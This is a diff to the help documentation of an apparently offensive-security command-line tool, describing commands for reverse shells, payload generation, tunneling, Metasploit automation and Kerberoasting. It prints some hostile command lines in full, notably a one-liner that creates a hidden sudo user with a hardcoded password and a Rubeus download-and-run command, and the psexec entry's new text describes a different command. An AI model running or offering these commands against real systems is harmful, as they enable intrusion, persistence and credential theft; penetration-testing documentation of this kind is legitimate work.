@@ -285,19 +285,23 @@ To manually run this command, use the following syntax:
 Replace `<domain>` with the actual domain name you want to query.
 
 ## psexec
-Executes the `impacket-psexec` command to run a remote command on a target machine using the `administrator` account.
+Copies the `rhost` IP address to the clipboard and updates the prompt with the IP address.
 
-1. Retrieves the target host IP from the `rhost` parameter.
-2. Checks if the `rhost` parameter is valid using `check_rhost()`. If invalid, the function returns early.
-3. Executes the `impacket-psexec` command with the `administrator` account on the target host.
+1. Retrieves the `rhost` IP address from the `self.params` parameter.
+2. Checks if the `rhost` is valid using `check_rhost()`. If invalid, the function returns without making changes.
+3. If `line` is 'clean', resets the custom prompt to its original state.
+4. Otherwise, updates the prompt to include the `rhost` IP address in the specified format.
+5. Copies the `rhost` IP address to the clipboard using `xclip`.
+6. Prints a message confirming that the IP address has been copied to the clipboard.
 
-:param line: This parameter is not used in this command but is included for consistency with other methods.
+:param line: This parameter determines whether the prompt should be reset or updated with the IP address.
+:type line: str
 :returns: None
 
 Manual execution:
 To manually run this command, use the following syntax:
-    impacket-psexec administrator@<target_host>
-Replace `<target_host>` with the IP address or hostname of the target machine.
+    do_rhost <line>
+Replace `<line>` with 'clean' to reset the prompt, or any other string to update the prompt with the IP address.
 
 ## rpcdump
 Executes the `rpcdump.py` script to dump RPC services from a target host.
@@ -956,32 +960,330 @@ Imprime todos los alias configurados.
 ## tcpdump_icmp
 se pone en escucha con la interfaz señalada por argumento ej: tcpdump_icmp tun0
 
+## rdp
+Reads credentials from a file, encrypts the password, and executes the RDP connection command.
+
+1. Reads credentials:
+    - Reads the username and password from the `sessions/credentials.txt` file.
+
+2. Encrypts the password:
+    - Uses `remmina --encrypt-password` to encrypt the password obtained from the file.
+
+3. Executes the RDP connection command:
+    - Uses the encrypted password to construct and execute the `remmina -c` command to initiate the RDP connection.
+
+:param line: This function does not use any arguments.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually execute the command:
+- Ensure `sessions/credentials.txt` contains the credentials in the format `username:password`.
+- Run the `rdp` command to read the credentials, encrypt the password, and connect to the RDP server.
+Example usage: `rdp`
+
+## base64encode
+Encodes a given string into Base64 format.
+
+1. Encodes the input string:
+    - Uses the `base64` library to encode the provided string into Base64 format.
+
+2. Displays the encoded string:
+    - Prints the Base64 encoded string to the terminal.
+
+:param line: The string to encode in Base64 format.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually encode a string in Base64:
+- Provide the string to the command and it will print the Base64 encoded result.
+Example usage: `base64encode HelloWorld`
+
+## base64decode
+Decodes a Base64 encoded string.
+
+1. Decodes the Base64 string:
+    - Uses the `base64` library to decode the provided Base64 encoded string back to its original form.
+
+2. Displays the decoded string:
+    - Prints the decoded string to the terminal.
+
+:param line: The Base64 encoded string to decode.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually decode a Base64 encoded string:
+- Provide the Base64 encoded string to the command and it will print the decoded result.
+Example usage: `base64decode SGVsbG9Xb3JsZA==`
+
+## grisun0
+Creates and copies a shell command to add a new user `grisun0`, set a password, add the user to the sudo group, and switch to the user.
+
+1. Displays the command:
+    - Prints the command to add the user `grisun0` with home directory `/home/.grisun0`, set the password, add the user to the `sudo` group, set the appropriate permissions, and switch to the user.
+
+2. Copies the command to clipboard:
+    - Uses `xclip` to copy the command to the clipboard for easy pasting.
+
+:param line: This function does not use any arguments.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually execute the command:
+- Copy the command from the clipboard.
+- Run it in a terminal to create the user and set up the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0
+Note: Ensure `xclip` is installed and available on your system.
+
 ## winbase64payload
-Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost
+Creates a base64 encoded PowerShell payload specifically for Windows to execute a `.ps1` script from `lhost`.
+
+1. Checks if `lhost` is set:
+    - Displays an error message and exits if `lhost` is not set.
+
+2. Checks if a file name is provided:
+    - Displays an error message and exits if no file name is provided.
+
+3. Constructs a PowerShell command:
+    - The command downloads and executes a `.ps1` script from `lhost` using `New-Object WebClient`.
+
+4. Encodes the PowerShell command:
+    - Converts the command to UTF-16LE encoding.
+    - Encodes the UTF-16LE encoded command to base64.
+    - Copies the final base64 command to the clipboard using `xclip`.
+
+:param line: The name of the `.ps1` file located in the `sessions` directory.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually use the payload:
+- Ensure `lhost` is set to the correct IP address.
+- Place the `.ps1` file in the `sessions` directory.
+- Use `xclip` to copy the generated base64 command to the clipboard.
+
+Note: Ensure `iconv`, `base64`, and `xclip` are installed and available on your system.
 
 ## revwin
-Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost
+Creates a base64 encoded PowerShell reverse shell payload specifically for Windows to execute a `.ps1` script from `lhost`.
+
+1. Checks if `lhost` and `lport` are set and valid:
+    - Uses `check_lhost(lhost)` to verify the `lhost` parameter.
+    - Uses `check_lport(lport)` to verify the `lport` parameter.
+    - Exits the function if either `lhost` or `lport` is invalid.
+
+2. Constructs a PowerShell reverse shell command with the following structure:
+    - Connects to the specified `lhost` and `lport` using `TCPClient`.
+    - Reads data from the TCP stream, executes it, and sends back the results.
+    - Appends the current path to the response for interactive use.
+
+3. Encodes the PowerShell command:
+    - Encodes the command in UTF-16LE.
+    - Converts the UTF-16LE encoded command to base64.
+    - Creates a PowerShell command that executes the base64 encoded payload.
+
+4. Copies the final PowerShell command to the clipboard:
+    - Uses `xclip` to copy the command to the clipboard.
+
+:param line: This parameter is not used in the function but is present for consistency with the method signature.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually use the payload:
+- Ensure `lhost` and `lport` are correctly set.
+- Use `xclip` to copy the generated PowerShell command to the clipboard.
+
+Note: Ensure `xclip` is installed and available on your system.
 
 ## asprevbase64
-create a base64 rev shell in asp, you need pass the base64 encodd payload, see help winbase64payload to create the payload base64 encoded
+Creates a base64 encoded ASP reverse shell payload and copies it to the clipboard.
+
+1. Checks if a base64 encoded payload is provided:
+    - If no payload is provided, displays an error message and exits the function.
+
+2. If a payload is provided:
+    - Creates an ASP script that uses `WScript.Shell` to execute a PowerShell command encoded in base64.
+    - The created ASP script writes the result of the PowerShell command to the response output.
+    - Uses `xclip` to copy the ASP script to the clipboard with the provided base64 encoded payload.
+
+:param line: The base64 encoded payload to be used in the ASP reverse shell.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually create the ASP payload:
+- Ensure you have the base64 encoded payload ready.
+- Use `xclip` to copy the provided command to the clipboard.
+
+Note: Ensure `xclip` is installed and available on your system. For help on creating the base64 encoded payload, see `help winbase64payload`.
 
 ## rubeus
-copia a la clipboard la borma de descargar Rubeus
+Copies a command to the clipboard for downloading and running Rubeus.
+
+1. Checks if `lhost` (local host IP) is set:
+    - If `lhost` is not set, displays an error message and exits the function.
+
+2. If `lhost` is set:
+    - Displays a message indicating that the Rubeus downloader command has been copied to the clipboard.
+    - The copied command downloads Rubeus from the specified `lhost` and saves it as `Rubeus.exe`.
+    - Uses `xclip` to copy the following command to the clipboard:
+    - `iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\Rubeus.exe kerberoast /creduser:domain.local\usuario /credpassword:password`
+
+:param line: Not used in this function.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually run these tasks, you would need to:
+- Ensure that `lhost` is set correctly.
+- Use `xclip` to copy the provided command to the clipboard.
+- Execute the downloaded Rubeus executable with the provided arguments.
+
+Note: Ensure `xclip` is installed and available on your system.
 
 ## socat
-run socat in ip:port seted by argument config the port 1080 in /etc/proxychains.conf
+Sets up and runs a `socat` tunnel with SOCKS4A proxy support.
+
+1. If no `line` (IP:port) argument is provided:
+    - Displays an error message indicating the need to pass `ip:port`.
+    - Exits the function.
+
+2. Displays a message instructing the user to configure `socks5` at `127.0.0.1:1080` in `/etc/proxychains.conf`.
+
+3. If a valid `line` argument is provided:
+    - Displays the command being run: `socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080`.
+    - Executes the `socat` command to listen on port 1080 and forward traffic to the specified IP and port using SOCKS4A proxy.
+    - Prints a shutdown message for the `socat` tunnel at port 1080.
+
+:param line: The IP and port (formatted as `ip:port`) to forward traffic to through the SOCKS4A proxy.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually run these tasks, you would need to:
+- Configure the `socks5` proxy settings in `/etc/proxychains.conf`.
+- Use the `socat` command with appropriate IP and port.
+
+Note: Ensure that `socat` is installed and properly configured on your system.
 
 ## chisel
-run download_resources command to download and run chisel :D like ./chisel_linux_amd64 server -p 3333 --reverse -v
+Automates the setup and execution of Chisel server and client for tunneling and port forwarding.
+
+1. If no `lhost` (local host IP) is set:
+    - Displays an error message indicating the need to set `lhost` using the `set` command.
+    - Exits the function.
+
+2. If no port argument is provided:
+    - Displays an error message indicating the need to provide a port number.
+    - Exits the function.
+
+3. If required Chisel files are not present:
+    - Displays an error message prompting the user to run the `download_resources` command.
+    - Exits the function.
+
+4. If a valid port is provided:
+    - Displays usage instructions for the Linux and Windows payloads.
+    - Constructs and copies the appropriate Chisel command to the clipboard based on user choice (1 for Windows, 2 for Linux).
+    - Extracts and sets up Chisel binaries for Linux and Windows from compressed files.
+    - Runs the Chisel server on the specified port and prints a shutdown message.
+
+:param line: The command line input containing the port number for Chisel setup.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually run these tasks, you would need to:
+- Ensure `lhost` is set using `set lhost <IP>`.
+- Provide the port number when calling the function.
+- Run the command `download_resources` if the Chisel files are missing.
+- Manually execute the Chisel commands for Linux or Windows as copied to the clipboard.
+
+Note: Ensure that all required files (`chisel_1.9.1_linux_amd64.gz` and `chisel_1.9.1_windows_amd64.gz`) are available in the `sessions` directory.
 
 ## msf
-automate msfconsole scan or rev shell
+Automates various Metasploit tasks including scanning for vulnerabilities, setting up reverse shells, and creating payloads.
+
+1. If no arguments are provided:
+    - Retrieves the target IP (`rhost`) from parameters.
+    - Checks if the IP is valid using `check_rhost()`. If invalid, exits the function.
+    - Creates a Metasploit resource script (`/tmp/scan_vulnerabilities.rc`) that includes commands for scanning ports, enumerating services, and checking for known vulnerabilities.
+    - Executes Metasploit with the created resource script and then deletes the temporary file.
+    - Prints a shutdown message after running the scan.
+
+2. If the argument starts with "rev":
+    - Sets up a reverse shell payload based on the specified platform and user choice (with or without meterpreter).
+    - Creates a Metasploit resource script (`/tmp/handler.rc`) for handling incoming reverse shell connections.
+    - Executes Metasploit with the created resource script and then deletes the temporary file.
+    - Prints a shutdown message after setting up the handler.
+
+3. If the argument starts with "lnk":
+    - Configures parameters (`lhost`, `lport`) for creating a payload.
+    - Uses `msfvenom` to generate a payload executable and saves it in the `sessions` directory.
+    - Creates an XML file (`download_payload.xml`) that will be used to download and execute the payload on a target machine.
+    - Creates a PowerShell script (`create_lnk.ps1`) to generate a shortcut file (`.lnk`) pointing to the payload.
+    - Prints instructions and generates a command to copy to the clipboard for setting up the payload and files.
+
+4. If the argument starts with "autoroute":
+    - Configures parameters for setting up a Metasploit session and autorouting.
+    - Creates a Metasploit resource script (`/tmp/autoroute.rc`) to handle exploit sessions and set up autorouting.
+    - Executes Metasploit with the resource script and starts a SOCKS proxy for routing traffic.
+    - Configures proxychains to use the Metasploit SOCKS proxy and prints instructions for using proxychains with tools.
+
+:param line: The command line input that determines which Metasploit task to automate.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually run these tasks, you would need to:
+- For scanning: Create and run the resource script using `msfconsole -r /tmp/scan_vulnerabilities.rc`.
+- For reverse shells: Configure and run the resource script with the appropriate payload settings.
+- For payload generation and shortcuts: Use `msfvenom` and create XML and PowerShell scripts as specified.
+- For autorouting: Create and run the resource script for autorouting and configure proxychains.
+
+Note: Ensure all required parameters (`lhost`, `lport`, etc.) are set before running these tasks.
 
 ## encrypt
-Encrypt a file using XOR. Usage: encrypt <file_path> <key>
+Encrypts a file using XOR encryption.
+
+1. Splits the provided `line` into `file_path` and `key` arguments.
+2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
+3. Reads the file specified by `file_path`.
+4. Encrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
+5. Writes the encrypted data to a new file with the ".enc" extension added to the original file name.
+6. Prints a message indicating the file has been encrypted.
+7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.
+
+:param line: A string containing the file path and the key separated by a space.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually run this command, use the following syntax:
+    encrypt <file_path> <key>
+Replace `<file_path>` with the path to the file to be encrypted and `<key>` with the encryption key.
 
 ## decrypt
-Decrypt a file using XOR. Usage: decrypt <file_path> <key>
+Decrypts a file using XOR encryption.
+
+1. Splits the provided `line` into `file_path` and `key` arguments.
+2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
+3. Reads the encrypted file specified by `file_path`.
+4. Decrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
+5. Writes the decrypted data to a new file by removing the ".enc" extension from the original file name.
+6. Prints a message indicating the file has been decrypted.
+7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.
+
+:param line: A string containing the file path and the key separated by a space.
+:type line: str
+:returns: None
+
+Manual execution:
+To manually run this command, use the following syntax:
+    decrypt <file_path> <key>
+Replace `<file_path>` with the path to the encrypted file and `<key>` with the decryption key.
 
 ## get_output
 Devuelve la salida acumulada
